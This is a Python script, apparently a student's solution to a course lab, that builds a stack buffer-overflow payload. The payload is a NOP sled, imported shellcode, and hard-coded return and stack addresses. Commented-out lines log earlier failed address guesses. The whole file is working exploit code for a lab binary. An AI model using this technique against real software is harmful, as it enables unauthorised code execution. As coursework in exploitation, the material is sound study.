#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
# padding = b"\xcc"*(2029-4)              # \xcc is a trap instruction... triggering indicates stack payload delivered
padding = (b'\x90')*(2029-4)              # \x90 is a nop instruction.... use as a sled to first shellcode instruction
ret_address = pack("<I", 0xffffd694)      # value to overwrite (where EIP should resume execution from)
to_overwrite = pack("<I", 0xfffe8e4c)     # address to manipulate (also on stack)
payload  = padding + shellcode + ret_address + to_overwrite
sys.stdout.buffer.write(payload)




## working through the memory...failed attempts :'(
#ret_address = pack("<I", 0xfffffff)
#ret_address = pack("<I", 0xffffcef7)
#ret_address = pack("<I", 0x0)
#to_overwrite = ret_address
#ret_address = pack("<I", 0xffffcef7)
#to_overwrite = pack("<I", 0xfffe8e50)
#to_overwrite = pack("<I", 0xdeadbeef)
#to_overwrite = pack("<I", 0xffffccc8)
############
#test = pack("<I", 0xfffe8e6c)
#################

#test = pack("<I", 0xfffe8e68)
#test = pack("<I", 0xffffcef7)
#test = pack("<I", 0xfffe8630)
#test = pack("<I", 0xfffe8e68)
#test = pack("<I", 0xffffccc8)
#test = pack("<I", 0xfffe8e4c)
#test =  pack("<I", 0xfffe8638)
#test = pack("<I", 0xffffccc8)
#test =  pack("<I", 0xfffe8e8c)
#payload  = padding + shellcode + test + to_overwrite #ret_address 
#test = pack("<I", 0xfffe8e6c)
#test = to_overwrite
